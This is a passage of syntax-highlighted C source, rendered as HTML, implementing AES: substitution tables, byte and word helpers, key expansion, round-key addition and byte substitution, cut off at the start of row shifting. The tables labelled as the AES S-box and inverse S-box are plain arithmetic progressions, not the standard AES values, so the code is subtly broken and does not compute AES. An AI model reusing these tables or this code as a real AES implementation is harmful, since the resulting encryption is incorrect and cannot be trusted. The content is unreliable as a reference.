class=p>,</span> <span class=mh>0xB1</span><span class=p>,</span> <span class=mh>0xC8</span><span class=p>,</span> <span class=mh>0xDF</span><span class=p>,</span> <span class=mh>0xF6</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x97</span><span class=p>,</span> <span class=mh>0xAE</span><span class=p>,</span> <span class=mh>0xC5</span><span class=p>,</span> <span class=mh>0xDC</span><span class=p>,</span> <span class=mh>0xF3</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x4F</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x7D</span><span class=p>,</span> <span class=mh>0x94</span><span class=p>,</span> <span class=mh>0xAB</span><span class=p>,</span> <span class=mh>0xC2</span><span class=p>,</span> <span class=mh>0xD9</span><span class=p>,</span> <span class=mh>0xF0</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x1E</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x91</span><span class=p>,</span> <span class=mh>0xA8</span><span class=p>,</span> <span class=mh>0xBF</span><span class=p>,</span> <span class=mh>0xD6</span><span class=p>,</span> <span class=mh>0xED</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x8E</span><span class=p>,</span> <span class=mh>0xA5</span><span class=p>,</span> <span class=mh>0xBC</span><span class=p>,</span> <span class=mh>0xD3</span><span class=p>,</span> <span class=mh>0xEA</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=mh>0x2F</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x8B</span><span class=p>,</span> <span class=mh>0xA2</span><span class=p>,</span> <span class=mh>0xB9</span><span class=p>,</span> <span class=mh>0xD0</span><span class=p>,</span> <span class=mh>0xE7</span><span class=p>,</span> <span class=mh>0xFE</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x2C</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>,</span> <span class=mh>0x9F</span><span class=p>,</span> <span class=mh>0xB6</span><span class=p>,</span> <span class=mh>0xCD</span><span class=p>,</span> <span class=mh>0xE4</span><span class=p>,</span> <span class=mh>0xFB</span><span class=p>,</span> <span class=mh>0x12</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=n>static</span> <span class=n>const</span> <span class=n>uint8_t</span> <span class=n>g_inv_sbox</span><span class=p>[</span><span class=mi>256</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=mi>0</span>     <span class=mi>1</span>     <span class=mi>2</span>     <span class=mi>3</span>     <span class=mi>4</span>     <span class=mi>5</span>     <span class=mi>6</span>     <span class=mi>7</span>     <span class=mi>8</span>     <span class=mi>9</span>     <span class=n>A</span>     <span class=n>B</span>     <span class=n>C</span>     <span class=n>D</span>     <span class=n>E</span>     <span class=n>F</span>  <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=mi>65</span><span class=p>,</span><span class=mi>232</span><span class=p>,</span><span class=mi>143</span><span class=p>,</span><span class=mi>54</span><span class=p>,</span><span class=mi>221</span><span class=p>,</span><span class=mi>132</span><span class=p>,</span><span class=mi>43</span><span class=p>,</span><span class=mi>210</span><span class=p>,</span><span class=mi>121</span><span class=p>,</span><span class=mi>32</span><span class=p>,</span><span class=mi>199</span><span class=p>,</span><span class=mi>110</span><span class=p>,</span><span class=mi>21</span><span class=p>,</span><span class=mi>188</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>177</span><span class=p>,</span><span class=mi>88</span><span class=p>,</span><span class=mi>255</span><span class=p>,</span><span class=mi>166</span><span class=p>,</span><span class=mi>77</span><span class=p>,</span><span class=mi>244</span><span class=p>,</span><span class=mi>155</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>233</span><span class=p>,</span><span class=mi>144</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>222</span><span class=p>,</span><span class=mi>133</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>211</span><span class=p>,</span><span class=mi>122</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=mi>111</span><span class=p>,</span><span class=mi>22</span><span class=p>,</span><span class=mi>189</span><span class=p>,</span><span class=mi>100</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>178</span><span class=p>,</span><span class=mi>89</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>167</span><span class=p>,</span><span class=mi>78</span><span class=p>,</span><span class=mi>245</span><span class=p>,</span><span class=mi>156</span><span class=p>,</span><span class=mi>67</span><span class=p>,</span><span class=mi>234</span><span class=p>,</span><span class=mi>145</span><span class=p>,</span><span class=mi>56</span><span class=p>,</span><span class=mi>223</span><span class=p>,</span><span class=mi>134</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>212</span><span class=p>,</span><span class=mi>123</span><span class=p>,</span><span class=mi>34</span><span class=p>,</span><span class=mi>201</span><span class=p>,</span><span class=mi>112</span><span class=p>,</span><span class=mi>23</span><span class=p>,</span><span class=mi>190</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>179</span><span class=p>,</span><span class=mi>90</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>168</span><span class=p>,</span><span class=mi>79</span><span class=p>,</span><span class=mi>246</span><span class=p>,</span><span class=mi>157</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>235</span><span class=p>,</span><span class=mi>146</span><span class=p>,</span><span class=mi>57</span><span class=p>,</span><span class=mi>224</span><span class=p>,</span><span class=mi>135</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>213</span><span class=p>,</span><span class=mi>124</span><span class=p>,</span><span class=mi>35</span><span class=p>,</span><span class=mi>202</span><span class=p>,</span><span class=mi>113</span><span class=p>,</span><span class=mi>24</span><span class=p>,</span><span class=mi>191</span><span class=p>,</span><span class=mi>102</span><span class=p>,</span><span class=mi>13</span><span class=p>,</span><span class=mi>180</span><span class=p>,</span><span class=mi>91</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>169</span><span class=p>,</span><span class=mi>80</span><span class=p>,</span><span class=mi>247</span><span class=p>,</span><span class=mi>158</span><span class=p>,</span><span class=mi>69</span><span class=p>,</span><span class=mi>236</span><span class=p>,</span><span class=mi>147</span><span class=p>,</span><span class=mi>58</span><span class=p>,</span><span class=mi>225</span><span class=p>,</span><span class=mi>136</span><span class=p>,</span><span class=mi>47</span><span class=p>,</span><span class=mi>214</span><span class=p>,</span><span class=mi>125</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>203</span><span class=p>,</span><span class=mi>114</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>192</span><span class=p>,</span><span class=mi>103</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>181</span><span class=p>,</span><span class=mi>92</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>170</span><span class=p>,</span><span class=mi>81</span><span class=p>,</span><span class=mi>248</span><span class=p>,</span><span class=mi>159</span><span class=p>,</span><span class=mi>70</span><span class=p>,</span><span class=mi>237</span><span class=p>,</span><span class=mi>148</span><span class=p>,</span><span class=mi>59</span><span class=p>,</span><span class=mi>226</span><span class=p>,</span><span class=mi>137</span><span class=p>,</span><span class=mi>48</span><span class=p>,</span><span class=mi>215</span><span class=p>,</span><span class=mi>126</span><span class=p>,</span><span class=mi>37</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>115</span><span class=p>,</span><span class=mi>26</span><span class=p>,</span><span class=mi>193</span><span class=p>,</span><span class=mi>104</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>182</span><span class=p>,</span><span class=mi>93</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>171</span><span class=p>,</span><span class=mi>82</span><span class=p>,</span><span class=mi>249</span><span class=p>,</span><span class=mi>160</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>238</span><span class=p>,</span><span class=mi>149</span><span class=p>,</span><span class=mi>60</span><span class=p>,</span><span class=mi>227</span><span class=p>,</span><span class=mi>138</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>216</span><span class=p>,</span><span class=mi>127</span><span class=p>,</span><span class=mi>38</span><span class=p>,</span><span class=mi>205</span><span class=p>,</span><span class=mi>116</span><span class=p>,</span><span class=mi>27</span><span class=p>,</span><span class=mi>194</span><span class=p>,</span><span class=mi>105</span><span class=p>,</span><span class=mi>16</span><span class=p>,</span><span class=mi>183</span><span class=p>,</span><span class=mi>94</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>172</span><span class=p>,</span><span class=mi>83</span><span class=p>,</span><span class=mi>250</span><span class=p>,</span><span class=mi>161</span><span class=p>,</span><span class=mi>72</span><span class=p>,</span><span class=mi>239</span><span class=p>,</span><span class=mi>150</span><span class=p>,</span><span class=mi>61</span><span class=p>,</span><span class=mi>228</span><span class=p>,</span><span class=mi>139</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>217</span><span class=p>,</span><span class=mi>128</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>206</span><span class=p>,</span><span class=mi>117</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>195</span><span class=p>,</span><span class=mi>106</span><span class=p>,</span><span class=mi>17</span><span class=p>,</span><span class=mi>184</span><span class=p>,</span><span class=mi>95</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>173</span><span class=p>,</span><span class=mi>84</span><span class=p>,</span><span class=mi>251</span><span class=p>,</span><span class=mi>162</span><span class=p>,</span><span class=mi>73</span><span class=p>,</span><span class=mi>240</span><span class=p>,</span><span class=mi>151</span><span class=p>,</span><span class=mi>62</span><span class=p>,</span><span class=mi>229</span><span class=p>,</span><span class=mi>140</span><span class=p>,</span><span class=mi>51</span><span class=p>,</span><span class=mi>218</span><span class=p>,</span><span class=mi>129</span><span class=p>,</span><span class=mi>40</span><span class=p>,</span><span class=mi>207</span><span class=p>,</span><span class=mi>118</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>196</span><span class=p>,</span><span class=mi>107</span><span class=p>,</span><span class=mi>18</span><span class=p>,</span><span class=mi>185</span><span class=p>,</span><span class=mi>96</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>174</span><span class=p>,</span><span class=mi>85</span><span class=p>,</span><span class=mi>252</span><span class=p>,</span><span class=mi>163</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>241</span><span class=p>,</span><span class=mi>152</span><span class=p>,</span><span class=mi>63</span><span class=p>,</span><span class=mi>230</span><span class=p>,</span><span class=mi>141</span><span class=p>,</span><span class=mi>52</span><span class=p>,</span><span class=mi>219</span><span class=p>,</span><span class=mi>130</span><span class=p>,</span><span class=mi>41</span><span class=p>,</span><span class=mi>208</span><span class=p>,</span><span class=mi>119</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>197</span><span class=p>,</span><span class=mi>108</span><span class=p>,</span><span class=mi>19</span><span class=p>,</span><span class=mi>186</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>175</span><span class=p>,</span><span class=mi>86</span><span class=p>,</span><span class=mi>253</span><span class=p>,</span><span class=mi>164</span><span class=p>,</span><span class=mi>75</span><span class=p>,</span><span class=mi>242</span><span class=p>,</span><span class=mi>153</span><span class=p>,</span><span class=mi>64</span><span class=p>,</span><span class=mi>231</span><span class=p>,</span><span class=mi>142</span><span class=p>,</span><span class=mi>53</span><span class=p>,</span><span class=mi>220</span><span class=p>,</span><span class=mi>131</span><span class=p>,</span><span class=mi>42</span><span class=p>,</span><span class=mi>209</span><span class=p>,</span><span class=mi>120</span><span class=p>,</span><span class=mi>31</span><span class=p>,</span><span class=mi>198</span><span class=p>,</span><span class=mi>109</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>187</span><span class=p>,</span><span class=mi>98</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>176</span><span class=p>,</span><span class=mi>87</span><span class=p>,</span><span class=mi>254</span><span class=p>,</span><span class=mi>165</span><span class=p>,</span><span class=mi>76</span><span class=p>,</span><span class=mi>243</span><span class=p>,</span><span class=mi>154</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>uint8_t</span> <span class=n>aes_sub_sbox</span><span class=p>(</span><span class=n>uint8_t</span> <span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>g_aes_sbox</span><span class=p>[</span><span class=n>val</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>uint32_t</span> <span class=n>aes_sub_dword</span><span class=p>(</span><span class=n>uint32_t</span> <span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint32_t</span> <span class=n>tmp</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>|=</span> <span class=p>((</span><span class=n>uint32_t</span><span class=p>)</span><span class=n>aes_sub_sbox</span><span class=p>((</span><span class=n>uint8_t</span><span class=p>)((</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)))</span> <span class=o>&lt;&lt;</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>|=</span> <span class=p>((</span><span class=n>uint32_t</span><span class=p>)</span><span class=n>aes_sub_sbox</span><span class=p>((</span><span class=n>uint8_t</span><span class=p>)((</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)))</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>|=</span> <span class=p>((</span><span class=n>uint32_t</span><span class=p>)</span><span class=n>aes_sub_sbox</span><span class=p>((</span><span class=n>uint8_t</span><span class=p>)((</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)))</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>|=</span> <span class=p>((</span><span class=n>uint32_t</span><span class=p>)</span><span class=n>aes_sub_sbox</span><span class=p>((</span><span class=n>uint8_t</span><span class=p>)((</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)))</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>uint32_t</span> <span class=n>aes_rot_dword</span><span class=p>(</span><span class=n>uint32_t</span> <span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint32_t</span> <span class=n>tmp</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=n>tmp</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>uint32_t</span> <span class=n>aes_swap_dword</span><span class=p>(</span><span class=n>uint32_t</span> <span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(((</span><span class=n>val</span> <span class=o>&amp;</span> <span class=mh>0x000000FF</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>        <span class=p>((</span><span class=n>val</span> <span class=o>&amp;</span> <span class=mh>0x0000FF00</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>        <span class=p>((</span><span class=n>val</span> <span class=o>&amp;</span> <span class=mh>0x00FF0000</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>        <span class=p>((</span><span class=n>val</span> <span class=o>&amp;</span> <span class=mh>0xFF000000</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>nr</span><span class=p>:</span> <span class=n>number</span> <span class=n>of</span> <span class=n>rounds</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>nb</span><span class=p>:</span> <span class=n>number</span> <span class=n>of</span> <span class=n>columns</span> <span class=n>comprising</span> <span class=n>the</span> <span class=n>state</span><span class=p>,</span> <span class=n>nb</span> <span class=o>=</span> <span class=mi>4</span> <span class=n>dwords</span> <span class=p>(</span><span class=mi>16</span> <span class=nb>bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>nk</span><span class=p>:</span> <span class=n>number</span> <span class=n>of</span> <span class=mi>32</span><span class=o>-</span><span class=n>bit</span> <span class=n>words</span> <span class=n>comprising</span> <span class=n>cipher</span> <span class=n>key</span><span class=p>,</span> <span class=n>nk</span> <span class=o>=</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>8</span> <span class=p>(</span><span class=n>KeyLength</span><span class=o>/</span><span class=p>(</span><span class=mi>4</span><span class=o>*</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=o>*/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>aes_key_expansion</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>key</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=nb>round</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint32_t</span> <span class=o>*</span><span class=n>w</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint32_t</span> <span class=o>*</span><span class=p>)</span><span class=nb>round</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>uint32_t</span>  <span class=n>t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>int</span>      <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>w</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=n>uint32_t</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>key</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=o>++</span><span class=n>i</span> <span class=o>&lt;</span> <span class=n>g_aes_nk</span><span class=p>[</span><span class=n>mode</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>((</span><span class=n>i</span> <span class=o>%</span> <span class=n>g_aes_nk</span><span class=p>[</span><span class=n>mode</span><span class=p>])</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span> <span class=o>=</span> <span class=n>aes_rot_dword</span><span class=p>(</span><span class=n>w</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span> <span class=o>=</span> <span class=n>aes_sub_dword</span><span class=p>(</span><span class=n>t</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span> <span class=o>=</span> <span class=n>t</span> <span class=o>^</span> <span class=n>aes_swap_dword</span><span class=p>(</span><span class=n>g_aes_rcon</span><span class=p>[</span><span class=n>i</span> <span class=o>/</span> <span class=n>g_aes_nk</span><span class=p>[</span><span class=n>mode</span><span class=p>]</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>g_aes_nk</span><span class=p>[</span><span class=n>mode</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>6</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>i</span> <span class=o>%</span> <span class=n>g_aes_nk</span><span class=p>[</span><span class=n>mode</span><span class=p>])</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span> <span class=o>=</span> <span class=n>aes_sub_dword</span><span class=p>(</span><span class=n>w</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span> <span class=o>=</span> <span class=n>w</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>w</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>w</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=n>g_aes_nk</span><span class=p>[</span><span class=n>mode</span><span class=p>]]</span> <span class=o>^</span> <span class=n>t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=o>++</span><span class=n>i</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>]</span> <span class=o>*</span> <span class=p>(</span><span class=n>g_aes_rounds</span><span class=p>[</span><span class=n>mode</span><span class=p>]</span> <span class=o>+</span> <span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>aes_add_round_key</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>state</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=o>*</span><span class=nb>round</span><span class=p>,</span> <span class=nb>int</span> <span class=n>nr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint32_t</span> <span class=o>*</span><span class=n>w</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint32_t</span> <span class=o>*</span><span class=p>)</span><span class=nb>round</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>uint32_t</span> <span class=o>*</span><span class=n>s</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint32_t</span> <span class=o>*</span><span class=p>)</span><span class=n>state</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>w</span><span class=p>[</span><span class=n>nr</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>]</span> <span class=o>+</span> <span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>aes_sub_bytes</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>state</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>state</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>aes_sub_sbox</span><span class=p>(</span><span class=n>state</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>aes_shift_rows</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>state</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=o>*</span><span class=n>s</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>state</span><span class=p>;</span>
